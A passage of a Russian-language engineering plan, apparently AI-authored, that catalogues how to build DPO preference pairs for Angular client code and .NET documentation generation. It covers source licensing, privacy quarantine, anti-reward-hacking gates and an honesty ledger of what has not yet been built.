  бесплатно и ломает монетизационный сплит. Честная классификация: это ПРОДУКТОВАЯ граница, НЕ
  privacy-карантин — источник первопартийный (код Luba, privacy/лицензионного трения нет); бинарная
  схема `common | PersonalAdaptive` третьего класса «платный common» не несёт, поэтому ближайшая
  честная проекция = `PersonalAdaptive` (paid-domain, license-gated) с явной пометкой
  NOT-for-free-common; schema-extension «paid-domain leg» = кандидат PE-10/DPO-build board, финальный
  сплит = продуктовое решение Luba (класс `LUBA_PRODUCT_DECISION_RESIDUAL`). **[pass-time PE-5; FIX-RES-1
  2026-07-14: сама задача 4 = `PersonalAdaptive` (G4 «решён»); этот `paid-domain leg` schema-extension = именно
  NARROWED opt-in остаток, остаётся non-blocking продуктовым решением Luba.]** Чужой пользовательский
  Angular-код — дополнительно `PersonalAdaptive`/`.xiigen` до redaction+approval (R-19), как у PE-4.
- **Source-disjoint нота (HeldOut):** train = первопартийные Angular-якоря РАЗНЫХ флоу (FLOW-01
  registration + FLOW-08 marketplace — живые клиенты РАЗНЫХ семей, VERIFIED: FLOW-08 `app.ts` 237
  строк, иной `ViewerRole`-союз public_marketplace_visitor/freelancer/business_partner); held-out =
  ДРУГАЯ source-семья (кандидаты: `RAG-07` seed-строки `EXT-SEC-005`/`EXT-ARCH-006`; `REACT-ADVANCED`
  — с честной нотой «React, не Angular»: пригоден для held-out суждения ФОРМЫ клиентского улучшения,
  не как Angular-код — зеркало SWE-bench-ноты PE-4); `HeldOut` — поле пары; лексический Jaccard-guard
  train↔eval обязателен (§1.3 п.9).
- **Лицензии `RAG-07` (обязательная нота прохода — legal-provenance гейт, VERIFIED живым grep этим
  пассом):** N4/N5 используют канонические ИМЕНА рубрик как ОСЬ СКОРЕРА — использование имени
  лицензией не обременено; но если реальный build ПОДТЯНЕТ их seed-СТРОКИ: `EXT-SEC-005` питается
  **NIST-SSDF (public-domain-US — нулевое трение, самый чистый источник, `RAG-07` :489)** +
  CWE-TOP25 (notice); `EXT-ARCH-006` питается **GOOGLE-AIP (CC-BY-4.0 — attribution required,
  `RAG-07` :342/:477)**. **`REACT-ADVANCED` — правило строгой лицензии (расхождение ЗАФИКСИРОВАНО
  живым grep):** реестр 32 источников (`RAG-07` :409) даёт `CC-BY-4.0 ATTRIBUTION_REQUIRED`;
  дедуп-таблица (`RAG-07` :839) даёт `CC-BY-4.0 / MIT` — правило прохода: при подтяжке любых
  `REACT-ADVANCED` строк действует СТРОЖАЙШАЯ трактовка — весь источник как CC-BY-4.0 с обязательной
  атрибуцией (сверка реестр-vs-дедуп = кандидат license-нормализации/свипа PE-10). Плюс
  framework-нота: `REACT-ADVANCED` строки React-СПЕЦИФИЧНЫ (`RAG-07` :224/:320) — в Angular-домен
  verbatim НЕ переносятся, только как паттерн-семья/held-out форма; framework-agnostic канонические
  рубрики (`secretPresence`, `idempotentCreate`, `apiVersioning`) переносятся полностью.
  **ANGULAR-источники (VERIFIED grep):** `ANGULAR-DOCS` (дедуп C3 :881: CC-BY-4.0/MIT, 66 строк) —
  среди **75 источников ВНЕ реестра** (:653, формального `licenseUseClass`-вердикта НЕТ) → до вердикта
  статус `VERIFY_BEFORE_USE`; MIT-безопасные малые: `ANGULAR-COMPONENTS` (MIT, :881), `ANGULARJS-SOURCE`
  (MIT, :881 — но AngularJS = ОТДЕЛЬНЫЙ домен, в Angular-пары не смешивать); `ANGULAR-STYLE` = источник
  домена B routing (:319). Первопартийный Angular-код `xiigen-flows` — собственность Luba,
  лицензионного трения нет (но LegScope — paid-домен, см. выше).
- **Композиция батча (ориентир будущего DPO-build, НЕ capability-заявка):** канонического
  распределения классов для клиент-домена НЕТ ни в `RAG-07`, ни в `RAG-10` — честная нота;
  ориентир-аналогия `RAG-10` §6.7: критические классы (`ng_unmanaged_subscription_leak`,
  `secretPresenceArbiter`) ≈ 25% батча, негативов 60–70% от positive; точный баланс = обязанность
  DPO-build, НЕ каталога.

#### PE-5.5 Блок 5 — ГЕЙТЫ ЧЕСТНОСТИ ПРИМЕРА

1. **Маркер срезается ДО обучения (§1.3 п.4):** `[WRONG:]` живёт в поле `WrongMarkers` и приклеен
   к `rejected`-ИСТОЧНИКУ, но из ТРЕНИРУЕМОГО `rejected`-представления срезается до токенизации —
   иначе тренер учит детекцию тега, а не качество кода.
2. **Acceptance-signal independence (plan-09 :504–:544; SI_GATE_6/SI_GATE_7):** `chosen` решает
   ТОЛЬКО детерминированный client-code-`IndependentDomainScorer` (`tsc`-парс + структурные детекторы
   рамки + rubric-чеки); `current_output_is_already_optimal` — диагностика, скоринг исполняется
   ВСЕГДА; `acceptance_signal_source != teacher_self_report` И `!= trained_unit_self_confidence`;
   best-of-K по self-logprob учителя = `forbidden_self_label`. Если ОБА (детерминированный
   winner-selector И judge-качество) могли бы авторствовать один `chosen` — ровно один назван
   авторитетом, другой eval/critic-only (SI_GATE_7): здесь авторитет — детерминированный
   `IndependentDomainScorer`, а не self-report; `Y_best`-selection классифицирован как
   детерминированный eval-only baseline (SI_GATE_6), не скрытая trainable-власть.
3. **Anti-reward-hacking (§1.3 п.7 (а)–(е) + код-специфика):** (а) НЕ константный промпт — пары
   батча от ≥2 разных компонентов/флоу (живые FLOW-01 registration + FLOW-08 marketplace, VERIFIED
   разные семьи); (б) НЕ length-hack — N1–N5 полные методы, длина ≈ длине (б) (одна инъекция, не
   огрызки; «короткий-хороший vs длинный-плохой» запрещён); (в) НЕ confidence-leakage — в
   код-текстах сторон нет confidence-полей; (г) НЕ measurement circularity — рубрика скорера (в) не
   производна от train-строк; (д) `chosen==rejected` → хард-гейт; **(е) mojibake-гейт — для клиента
   ЖИВОЙ и острый (сильнее, чем у PE-4):** template-строки 47 клиентов несут ИВРИТ (`FLOW-01
   app.html:8/:47/:58/…`, `app.ts:142–:152` `hebrewLabel`) — порча скрипта в любой стороне пары =
   провал гейта (у PE-4 латиница-C# делала ось малорелевантной, здесь она НЕСУЩАЯ); **(ж)
   КОД-СПЕЦИФИЧНЫЙ хак — НЕ форматирование-как-сигнал:** запрещён паттерн «`chosen` идеально
   отформатирован vs `rejected` с кривыми отступами» — тренер выучит форматирование, не семантику
   дефекта; whitespace-нормализация ОБЕИХ сторон до токенизации — обязанность builder'а (живой
   `.prettierrc`/`eslint` в каждом клиенте — готовый нормализатор-канон). Смежный код-хак: НЕ
   «идентификатор-как-сигнал» (`rejected` с говорящими именами `badMethod`/`leakyStream`) — имена
   нормализуются/абстрагируются.
4. **`PromptError-05 Deterministic Shortcut` — предохранитель СКОРЕРА (не класс негатива):** сам
   `IndependentDomainScorer` НЕ смеет быть скрытым детерминированным лукапом, выдающим себя за
   trainable-судью — он eval-only детерминированный арбитр ПО ДИЗАЙНУ и назван так честно (не
   «обученный critic»); trainable-нога — это client-code юнит-СТУДЕНТ, не скорер (allowed-level
   `ILogicalUnit`, trainable-architecture-decision Layer 5A / generated-code-review Layer 5).
5. **Карантин-классы (§1.3 п.11):** легальный — `REACT-ADVANCED` CC-BY-4.0-производные строки →
   attribution-нога (строгая трактовка дуал-лицензии, PE-5.4); `ANGULAR-DOCS` без реестрового
   вердикта → `VERIFY_BEFORE_USE`, НЕ импортировать до вердикта; закрытая проприетарная
   teacher-модель → `DATASET_REBUILD_REQUIRED`; privacy — чужой пользовательский клиентский код →
   `PersonalAdaptive`/`.xiigen` до redaction+approval (`BLOCK_FOR_COMMON`); **secretPresence-ось:**
   литеральный ключ в N4 `'xiigen_pk_live_7f3ab9c2d41e'` — СИНТЕТИЧЕСКИЙ placeholder (не реальный
   секрет; настоящий секрет в строке = провал `secretPresence`-класса и карантин строки); демо-креды
   живого кода (`'new.member@example.com'`/`'local-demo-password'` — `app.ts:33–:34`) — сами
   синтетические, реальные пользовательские e-mail/пароли в строках пары запрещены; leakage —
   `ExcludedLeakageSignals` (`candidate_index`/`source_path`/`source_id`/`file_order`/`correlation_id`/
   `exact_prompt`).
6. **`margin > 0.05`** (иначе `LOW_CONTRAST`, plan-07 :520); слабый негатив → отбраковка
   предохранителем (§1.3 п.6), НЕ обучение.
7. **Честность статуса (`catalog != capability`):** каталог = plan-content; учитель Qwen3.5-9B /
   Ollama НЕ вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); `tsc`-чекер/scorer/builder/
   обучаемый client-code юнит в коде НЕ существуют — все capability-элементы **[условно от M1/M2]**;
   `RegistrationApi`-сервис и весь API-wiring слой в живом коде НЕ существуют (counted: `0`
   HttpClient/subscribe по 47 клиентам) — сервис-контракт = плановая проекция (`SYNTHETIC_SEED`) от
   `RAG-02` :468 + серверного API FLOW-01 (PE-4-якорь); `Y_goal` (б) — авторская проекция ФОРМЫ
   живого signal-паттерна (spot-read якоря процитированы), НЕ выход реального учителя и НЕ
   verbatim-копия файла.

#### PE-5.6 Блок 6 — ИСТОЧНИК РЕАЛИЗМА (read-only цитаты с путями; VERIFIED = живой spot-read этим пассом)

| Что обосновано | Источник (file:line) | Статус проверки этим пассом |
|---|---|---|
| Живой signal-паттерн: standalone `@Component` без NgModule; `signal<T>()`/`computed()`; `submitRegistration()` СТАТИЧЕСКИЙ (без API — только signal-мутации); RTL/иврит `applyLanguage`/`hebrewLabel`; демо-креды `email`/`password`/`token` | `xiigen-flows/flows/FLOW-01-user-registration/client/angular/src/app/app.ts:21–:26, :29–:36, :33–:35, :53–:55, :98–:101, :121–:125, :142–:152` (файл 169 строк) | VERIFIED (живой read всего файла) |
| Живой template-паттерн (двух-текстовый юнит .html): `@if`/`@for` control flow; `[ngModel]`-на-сигнале + `(ngModelChange)`; `data-testid` (Playwright); `role="status"`; иврит в шаблоне | `.../FLOW-01-user-registration/client/angular/src/app/app.html:8, :17, :31, :40, :51, :55, :57, :70` (файл 148 строк) | VERIFIED (живой read всего файла) |
| Зонтик ошибок клиента `provideBrowserGlobalErrorListeners()` + router; один route на `App` | `.../FLOW-01-user-registration/client/angular/src/app/app.config.ts:6–:11`; `.../app.routes.ts:4–:8` | VERIFIED (живой read обоих файлов) |
| Тот же паттерн в ДРУГОЙ семье флоу (генерализация): standalone+signals, иной `ViewerRole`-союз (public_marketplace_visitor/freelancer/business_partner) | `.../FLOW-08-marketplace/client/angular/src/app/app.ts:1–:12` (файл 237 строк) | VERIFIED (живой read головы файла) |
| Counted корпусная нота (ПОСЧИТАНО, не оценка): 47 клиентов; `188` non-spec `.ts` = 47×{main/app/app.routes/app.config}; `47` `.spec.ts`; `235` всего; `0` `*.component.ts`/`*.service.ts`; `0` HttpClient/`@angular/common/http`/rxjs-import/`subscribe(`/`provideHttpClient`/`takeUntilDestroyed`; `47` файлов `signal()` | grep/find этим пассом по `flows/FLOW-*/client/angular` (исключая node_modules/.spec) | VERIFIED (живой counted grep) |
| API-wiring evidence: клиент ДОЛЖЕН звать серверные endpoints (форвард-обоснование сервис-контракта) | `RAG-02-orchestrator-extension.md:468` («Client integration: Angular app should call backend job endpoints») | VERIFIED (живой grep — точная цитата) |
| Paid=Angular mapping (Free=.NET; Paid=Angular/AngularJS/Java/SQL; `LicenseManager`/`DomainLoader`/CDN; приватный репо `xiigen_smart_domains`) | `RAG-02-orchestrator-extension.md:18, :38, :142, :933` | VERIFIED (живой grep) |
| AngularJS = намеренно ОТДЕЛЬНЫЙ домен (не смешивать с Angular 2+) | `RAG-02-orchestrator-extension.md:860, :932` | VERIFIED (живой grep) |
| `secretPresenceArbiter` рубрика (ACCEPT env/secrets-manager; REJECT любой литерал креда, «репо приватное» не оправдание; CWE-798) + seed `EXT-SEC-005` + источники NIST-SSDF/CWE-TOP25 | `RAG-07-external-sources.md:457, :287` | VERIFIED (живой grep) |
| `idempotentCreateArbiter` рубрика (idempotency-key, «key от клиента», AIP-133) + seed `EXT-ARCH-006` + источник GOOGLE-AIP | `RAG-07-external-sources.md:477, :293` | VERIFIED (живой grep) |
| Лицензии: NIST-SSDF public-domain-US «самый чистый» (:489); GOOGLE-AIP CC-BY-4.0 attribution (:342); OWASP-ASVS CC-BY-SA-4.0 share-alike (:286/:342); SWE-BENCH MIT (:335); `REACT-ADVANCED` реестр CC-BY-4.0 (:409) vs дедуп CC-BY-4.0/MIT (:839) — расхождение → строжайшая трактовка | `RAG-07-external-sources.md:489, :342, :286, :335, :409, :839` | VERIFIED (живой grep) |
| ANGULAR-источники: `ANGULAR-DOCS` вне реестра 32 (нет `licenseUseClass`-вердикта, :653) но дедуп C3 CC-BY-4.0/MIT 66 строк (:881); `ANGULAR-COMPONENTS`/`ANGULARJS-SOURCE` MIT (:881); `ANGULAR-STYLE` источник домена B (:319) | `RAG-07-external-sources.md:653, :881, :319` | VERIFIED (живой grep) |
| Angular-оси экзаменаций (`computed()` vs `effect()` — `ng_effect_for_derived_state`) | `RAG-07-external-sources.md:224` | VERIFIED (живой grep) |
| `ARBITER-VOCABULARY` нормализация (2004 различных имени в поле `arbiters` → канонические гейты) ДО импорта rubric-строк | `RAG-07-external-sources.md:1187` | VERIFIED (живой grep; точный Tier-1 shortlist :1268–:1291/:1302–:1304 — CITED образец-Fable, этим пассом не перечитан) |
| 14 полей `GraphDpoPair` (канон пары, owner блок 07) | `active-codex-execution-plan-07-dpo-builder.md:246–:261` (через §1.4 каталога) | VERIFIED (живой read reward-секции :341–:360; :246–:261 — владелец §1.4) |
| Reward-scalarization: `reward(side)=Beta·(policyLogP−referenceLogP)` + `margin` + `preference_score`-only + `REWARD_EXTRACTOR_MISSING` | `active-codex-execution-plan-07-dpo-builder.md:341–:360` | VERIFIED (живой read) |
| Bounded teacher-call Шаг 3a + budget num_ctx≈8192 + `k_generations=4` + `TeacherProvenanceAdapter` + acceptance-independence + Y_best determinism | `active-codex-execution-plan-09-auto-dpo-loop.md` §Шаг 3a :492–:502, :497–:498, :504–:544 | CITED (владелец каталога §1.1; PE-3 VERIFIED live; этим пассом через §1.1/§1.4) |
| Профиль учителя `qwen35-local-v1` (num_ctx≈8192, local self-hosted open-weight) + `TeacherProvenance` 20 полей | `active-codex-execution-plan-08-legal-teacher-gate.md` §3.5.2 :779–:833, §3.1 :389–:409 | CITED (владелец каталога §1.1/§1.4; этим пассом не перечитан) |
| `TP1_LOCAL` eval/quarantine до `G-DPO-FINAL` (`DpoTrainReady=false`, нет `TrainBatchAsync`) | `active-codex-execution-two-phase-local-remote-overlay.md:48–:53` | CITED (владелец каталога карта; PE-2/PE-3/PE-4 VERIFIED live) |
| Секция-источник переноса (перенос с переякориванием) | `PLAN-VS-VSCODE-CONTINUE-v1.md:4716–:4940` (проход PE-5 Fable) | VERIFIED (живой read) |
| R6 SIMPLE AGENT BOUNDARY (тонкий клиент — «no internal algorithm logic in the agent layer») — llm_mvp_core-родство клиентской рамки; Rule 1/Rule 2 DNA-ось (серверная половина PE-4) | `llm_mvp_core/CLAUDE.md` «Luba way-of-working rules pattern» R6 + «The 10 Rules» | CITED (родственный репо, не сверялся построчно этим пассом) |
| Серверная половина той же пары рубрик (FLOW-01 `UserRegistrationService`/`EmailVerificationService` — сервер того же флоу; симметрия клиент↔сервер) | этот каталог PE-4.3 N4/N5 + PE-4.6 | VERIFIED (в этом же файле) |

#### PE5-ЛОГ — Что добавлено + счётчики + честность

1. **Добавлено (append-only):** эта секция «Prompt-Examples проход PE-5/10 — Задача 4 — Клиентский
   код (Angular)» (блоки 1–6); обновлена ОДНА строка статус-таблицы §5.2 (Клиентский код →
   ЗАПОЛНЕНО PE-5, маркер `[FIX-PE-5]`) и front-matter `pass` + `pass_pe5_fill` (single-owner FC-44:
   заголовок и строка статуса свипнуты в ОДНОМ шаге, `stale-status-carrier` исключён). Прочий старый
   текст НЕ переписан; неточность карты (platform/mvp как Angular-дома) уже несёт §3 нота «в» —
   правки не требует.
2. **Счётчики — БЕЗ изменений:** WO 53 / решения 26 / ветки 55 / связи 21 / M5=46 — каталог =
   plan-content, не work-order; реального нового WO проход не создал (движение счётчика возможно
   только в PE-10). `readiness` плана (`PLAN_NOT_READY`) НЕ тронут.
3. **Пакет честности:** изменён ТОЛЬКО этот файл. Примеры — ПЛАНОВЫЕ ОБРАЗЦЫ: Ollama/учитель НЕ
   вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); `tsc`-чекер/scorer/builder/обучаемый
   client-code юнит в коде НЕ существуют; `Y_best`/`Y_goal`/N1–N5 — АВТОРСКИЕ композиции
   (`SYNTHETIC_SEED`) ПО ФОРМЕ живого кода (spot-read якоря процитированы), НЕ выходы реальных
   моделей и НЕ verbatim-копии файлов; **API-wiring слой (`RegistrationApi`/HttpClient/подписки) в
   живых 47 клиентах ОТСУТСТВУЕТ (counted: 0 хитов) — это форвард-проекция, честно маркированная**;
   «форма компонента» (signals/standalone/control-flow/RTL/a11y) — ЖИВАЯ (split-honesty PE-5.4);
   overlap-значения — целевые by construction, НЕ измеренный `overlap_ratio`; порог 0.75 клиентского
   гейта — концептуальный перенос PE-4.4, НЕ калиброванный; токен-оценки бюджета — аппроксимация, не
   замер; продуктовый код/тесты/git-write НЕ выполнялись. **Против образца-Fable этот проход богаче
   на counted spot-read:** ПОСЧИТАНЫ реальные тоталы (188 non-spec .ts = 47×default-shell, 0
   feature-компонентов/сервисов, 0 HttpClient/subscribe/DestroyRef по всем 47) вместо оценки «47×5»;
   VERIFIED живым grep лицензии `RAG-02`/`RAG-07` (образец-Fable многие оставлял CITED); flip
   `DpoTrainReady` `true→false` (образец-Fable ставил `true` — у нас это `dual-live-canon` статуса
   готовности, FC-44); все 6 `ExcludedLeakageSignals` (образец нёс 5, потерял `source_id`).
   Spot-read ≠ полное чтение репо: читались FLOW-01 (весь) + FLOW-08 (голова); остальные 45 клиентов
   — counted grep, не построчное чтение; `xiigen-platform`/`xiigen mvp` — не читались этим пассом
   (нота карты §3 «в» историческая). Негативы N1–N5 = 3 доменно-локальных Angular-кода (КАЖДЫЙ с
   родителем `PromptError-02 No DNA Safety`) + 2 канонических `RAG-07`-имени как ось скорера;
   `RAG-07`-рубрики — ось скорера, НЕ код негатива (переякоривание против образца, single-owner
   FC-44); `ORCH`/переводческие/серверные `dna_*`-коды в клиентском коде НЕ используются (§2.3).
   Полный баланс классов (12 `PromptError` + 23 `RAG-07`-гейта + доменные `ng_*`) = обязанность
   DPO-build, НЕ каталога. Валидация прохода = Opus 4.8 (родитель) ДО старта PE-6 (серверная
   документация).

---
*Конец прохода PE-5/10. PE-6 (Серверная документация — `42.ProjectWikiDomain` documentation
pipeline над .NET-кодом) стартует после валидации Opus 4.8 этого прохода (канон-переключение PE-6:
таксономия — `PromptError-09 Missing Documentation Sync` / 11 Vague Deliverables / 12 Context
Dependency + `ORCH-02 Missing Evidence`; ось скорера — grounding-проверка «каждое утверждение
ссылается на реальный код-факт» (anti-hallucination, порог из `RAG-02`); ГЛАВНЫЙ УРОК `RAG-02`:
base-модель документации ПРОВАЛИЛА held-out → примеры doc-задач обязаны быть grounding-проверяемыми,
не свободным пересказом; LegScope — Free=.NET common-кандидат [обратно к серверу PE-4], но
приватность `.xiigen`; живой источник — `project_documentation_pipeline` над `src/Xiigen.*`,
spot-read обязателен).*

---

## Prompt-Examples проход PE-6/10 — Задача 5 — Серверная документация (`42.ProjectWikiDomain` doc-pipeline над .NET)

**[FIX-PE-6]** **Дата:** 2026-07-14. **Автор:** Opus 4.8 (Ultracode), одиночный
bounded architect-author прохода PE-6/10 (PLAN-ONLY, R2: ни продуктового кода, ни
тестов, ни ollama, ни git-write; правился ТОЛЬКО этот файл; наш план 07/08/09/overlay,
`RAG-02`/`RAG-01` и живой код `42.ProjectWikiDomain` в `llm_mvp_core` читались read-only).
**Авторитет:** живая unquoted-директива Luba 2026-07-13 (каталог примеров промптов
positive/negative под 8 задач, «в соответствии с реализацией», переносом из плана-источника
с переякориванием на наш канон) + вердикт Opus 4.8 на PE-5 — VALID. Содержание = заполненный
шаблон §2.1 для задачи 5 «Серверная документация». Перенос из секции-источника «Prompt-Examples
проход 6/10 (Fable)» (`PLAN-VS-VSCODE-CONTINUE-v1.md` :4948–:5196): ярлыки источника
`2PH-2.x/2PH-3.x/PE-1.x/R-NN` переякорены на наши блоки 07/08/09 + overlay + §1–§5. Второй канон
НЕ создаётся.

**Канон-переключение против образца-Fable (по праву §2.3 + CARRY PE-5→PE-6 + counted spot-read
этим пассом):**
- **(а) Таксономия негативов доков = 1 явный доменно-локальный КРИТИЧЕСКИЙ код
  `doc_hallucinated_claim` (false-presence) + 4 канонических кода строки 5 карты §3**
  (`ORCH-02 Missing Evidence` + `PromptError-09 Missing Documentation Sync` / `11 Vague
  Deliverables` / `12 Context Dependency`). `doc_hallucinated_claim` заявлен доменно-локальным
  потому, что hallucination — главный ИЗМЕРЕННЫЙ дефект домена (`RAG-02` `hallucination_rate=0.68`
  при пороге 0.00) — не мапится ни на один канонический `PromptError`/`ORCH`-код И ОТСУТСТВУЕТ в
  живой негативной таксономии генератора: counted live-read `DocumentationGeneratorDpoGenerator`
  этим пассом дал **10 rejected-веток — 9 `missing_*` + `partial_documentation` — ВСЕ класса
  omission/false-absence, 0 классов addition/false-presence** (переименовывать канонические имена
  ЗАПРЕЩЕНО, single-owner FC-44).
- **(б) Ось скорера — ПЕРВИЧНО evidence-grounding дифференциал, overlap — ВТОРИЧНО.** В отличие
  от код-задач PE-4/PE-5 (там первичен CODE-OVERLAP), у доков разделяющий сигнал пары — не
  текстовая близость, а grounding-дифференциал (`chosen`: каждое утверждение → `file:line`/ev;
  `rejected`: ≥1 ungrounded ЛИБО ≥1 привязка, чей факт не поддерживает утверждение). Doc-overlap
  `0.75` (рестейт PE-4.4/PE-5.4 с доковой рамкой) остаётся, но ВТОРИЧНЫМ (PE-6.4).
- **(в) LegScope = `common`-кандидат [обратно к серверу PE-4, ПРОТИВОПОЛОЖНО Paid=Angular PE-5]:**
  `RAG-02` :18 называет Free-tier ПО ИМЕНИ этого домена — «Бесплатный tier = .NET домен
  (`42.ProjectWikiDomain`)»; источник = первопартийный код/трассы Luba. НО ЖЁСТКАЯ privacy-граница
  R-07/R-13: доки/индекс ЧУЖОГО пользовательского кода → `PersonalAdaptive`/`.xiigen`
  (`BLOCK_FOR_COMMON`).
- **(г) `DpoTrainReady=false` [условно от M1 + G-DPO-FINAL] — ФЛИП против образца-Fable (тот
  ставил `true`):** как PE-2/PE-3/PE-4/PE-5, наш каталог требует `false` до `G-DPO-FINAL` для ВСЕХ
  задач, иначе `dual-live-canon` статуса готовности (FC-44). С ЧЕСТНОЙ доменной нотой уникальности
  (PE-6.4): это ЕДИНСТВЕННЫЙ домен PE-2..PE-6 с ЖИВЫМ DPO-генератором в коде И измеренным
  ПРОВАЛЬНЫМ baseline (`0.286`/`0.68`) — training target тут задокументирован, а не гипотеза; но
  `false` держат `G-DPO-FINAL` + отсутствие builder/скорера/grounding-чекера канона.

### Задача 5 — Серверная документация (`42.ProjectWikiDomain` `project_documentation_pipeline` над `src/Xiigen.*`)

#### PE-6.1 Блок 1 — ДОМЕН РЕАЛИЗАЦИИ + адресация пары

По-человечески: задача 5 — ИЗНАЧАЛЬНАЯ цель всего проекта: офлайн-документирование кода локальной
моделью (`RAG-01` :10 — ветка-родоначальница `local_wiki_planning` = «документирование кода
локально/офлайн», поглощена активными 42/43-доменами, `RAG-01` :42). Пользователь расширения
VS/VS Code просит «задокументируй этот .NET-метод»; конвейер домена: запрос документации → code
trace → documentation graph → negative DPO candidates → evidence index → project-local wiki ответ.
Владелец-домен (карта §3 строка 5) — `42.ProjectWikiDomain` (`llm_mvp_core`), подтверждён ЖИВЫМ
counted spot-read этим пассом (как PE-4 читал реальные `.cs` xiigen, здесь читались реальные `.cs`
самого домена документации).

**Counted spot-read факты живого домена (live-read `.cs` ЭТИМ пассом, ПОСЧИТАНО, не оценки —
гейт claim-verification «посчитанные тоталы»):**
1. **Маршрут зарегистрирован и честен.** `ProjectDocumentationPipelineFlowAdapter : ILogicalFlow<string>`
   (`ProjectDocumentationPipelineFlowAdapter.cs:7`), `FlowId="project-documentation-pipeline-flow"` (:9),
   `ScenarioId="project_documentation_pipeline"` (:10); runtime-вердикт ЧЕСТНЫЙ —
   `DOCUMENTATION_GRAPH_READY_TRAINING_RUNNER_MISSING` ЛИБО `DOCUMENTATION_GRAPH_REVIEW_REQUIRED`
   (:46–:48), `training_status="runner_missing"` (:68). Оркестратор
   `ProjectDocumentationPipelineOrchestrator : ILogicalOrchestrator`
   (`ProjectDocumentationPipelineOrchestrator.cs:8`), `FlowId="project-documentation-pipeline-orchestrator"`
   (:10): цепочка `DocumentationOrchestrator.GenerateAsync` (:38) → `ProjectWikiCoverageVerifier.VerifyGraphAsync`
   (:50) → `ProjectWikiRealProjectValidationRunner.ValidateGraphAsync` (:59); warning
   `documentation_graph_ready_training_runner_missing` (:74); живой числовой носитель grounding-оси —
   `exact_evidence_accuracy` (:129) + `entity_impact_trace_pass_rate` (:132); honest-строка
   вывода: «Training runner is still missing; no trained-weight claim was made» (:153) — родство
   `CLAUDE.md` «Project wiki domain» (`DOCUMENTATION_GRAPH_READY_TRAINING_RUNNER_MISSING`/`runner_missing`).
2. **Генератор дока — plain sealed class, НЕ `ILogicalUnit`** (честный scaffold-шаблонизатор):
   `DocumentationGeneratorUnit` (`DocumentationGeneratorUnit.cs:6`, `UnitId="documentation-generator-unit"` :8);
   `Generate(ProjectDocumentationUnit)` (:11) считает **8 обязательных флагов секций** (:19–:29,
   включая `EvidenceIds.Length > 0` :28); warning `documentation_required_field_missing` (:30);
   `Confidence` = доля заполненных флагов `flags.Count(...) / flags.Length` (:43 — self-report юнита,
   ловушка независимости PE-6.5 п.2); живой 8-секционный шаблон дока — `# Symbol / ## Meaning /
   ## Location {SourcePath}:{SourceLine} / ## Parameters / ## Return / ## Called By / ## Calls /
   ## Stack And Version / ## Evidence` (:54–:82). **Ключевой факт для THE-негатива:** все 8 флагов —
   проверки ПРИСУТСТВИЯ (`!string.IsNullOrWhiteSpace`/`Length > 0`); юнит физически НЕ умеет поймать
   утверждение, которое ПРИСУТСТВУЕТ, но ЛОЖНО (hallucination) — только отсутствие поля.
3. **Живой доменный DPO-предшественник + counted таксономия негативов.**
   `DocumentationGeneratorDpoGenerator.BuildBatchAsync` (`DocumentationGeneratorDpoGenerator.cs:15`)
   строит батчи `DocumentationGeneratorDpoPair(PairId, Unit, A, Chosen, Rejected, RejectedType)` с
   гейтами `batch_row_count_not_50` + `wrong_annotation_rate_below_gate` (:39–:44) и `[WRONG:]`
   ПРЯМО в rejected-тексте (:74–:97). **Counted rejected-ветки `BuildRejected` (:74–:97):**
   `missing_callers`, `missing_callees`, `missing_stack_version`, `missing_evidence` (:83–:84 —
   «produces text that cannot be cited or verified»), `missing_sql_parameters`,
   `missing_sql_result_shape`, `missing_sql_side_effects`, `missing_dotnet_callers`,
   `missing_stored_procedure_identity` (**9 `missing_*`**) + default `partial_documentation`
   (:95–:96) = **10 веток, ВСЕ omission/false-absence; НИ ОДНОГО класса false-presence/addition/
   hallucination**. Даже самый близкий к ложному утверждению случай (`missing_sql_side_effects` —
   «marks a state-changing procedure as safe») закодирован как «missing», не как «wrong assertion».
4. **THE-пробел точно локализован (перепроверено spot-read, богаче образца-Fable).** False-presence
   watch-сигналы у домена ЕСТЬ, но живут в СИБЛИНГ-юнитах, НЕ в `DocumentationGenerator`:
   `CodeTraceBuilder` несёт `invented_callee 0.9`, `EntityImpactMapper` — `wrong_project_evidence 0.8`
   (`RAG-02` :253–:254), а `DocumentationGenerator` PROMOTED только для stored-procedure docs
   (`RAG-02` :255) и гейтит ТОЛЬКО omission. То есть юнит, который буквально эмитит прозу,
   провалившую held-out на галлюцинациях (`0.68`), сам НЕ несёт ни одного класса false-presence —
   ближайшие false-presence сигналы заперты в upstream-юнитах трассы. `N1 doc_hallucinated_claim`
   сеет ровно этот недостающий класс в doc-генераторе.

**Записи домена (counted, `ProjectWikiDomainModels.cs`):** `DocumentationGeneratorOutput` — 12
полей, поле №11 `Confidence` (double) (:1126–:1138); `DocumentationGeneratorDpoPair(PairId, Unit,
A, Chosen, Rejected, RejectedType)` (:1140–:1146) — доменный record, **НЕ второй канон пары**:
`GraphDpoPair` (14 полей, блок 07, §1.4) остаётся каноном, live→канон маппинг — обязанность
builder'а WO-M1.1; типизированный вход `ProjectDocumentationUnit` — **15 counted полей**
(`DocumentationUnitId, ProjectId, RepositoryRoot, SourcePath, SourceLine, SymbolName,
DocumentationLevel, TargetFramework, CSharpLanguageVersion, Meaning, Parameters[], ReturnValue,
Callees[], Callers[], EvidenceIds[]`, :1561–:1576).

Адресация пар (канон блока 07 — `GraphDpoPair.Level` / `NodeOrEdgeId`, §1.4):
- **`Level="unit"`** (train-ready ОБЯЗАН быть `"unit"`, plan-07 :248) — единица = ОДИН короткий
  wiki-док ОДНОГО метода в жёстком 8-секционном шаблоне, НЕ node/edge-план.
- **`NodeOrEdgeId="server-docs/xiigen-platform/marketplace-publish-listing"`** — паттерн карты §3
  строки 5 (`server-docs/<проект>/<файл>`).
- **LegScope: `common`-кандидат (Free=.NET tier) — переобоснование ОБРАТНО к серверу PE-4,
  противоположно Paid=Angular PE-5:** `RAG-02` :18 (VERIFIED живым grep этим пассом) называет
  Free-tier ПО ИМЕНИ — «.NET домен (`42.ProjectWikiDomain`)»; источник = первопартийный код/трассы
  Luba (`source_authority=first_party_internal`). ЖЁСТКАЯ privacy-граница R-07/R-13: пары из
  доков/трасс ЧУЖОГО пользовательского проекта → `PersonalAdaptive`/`.xiigen` до redaction+approval
  (`BLOCK_FOR_COMMON`); внешние doc-корпуса при подтяжке проходят лицензионный гейт (MIT/Apache
  preferred), в ЭТОМ проходе внешние корпуса НЕ подтягивались.
- Честные ноты домена: (а) обучаемый doc-юнит НЕ доказан — base-модель документации ПРОВАЛИЛА
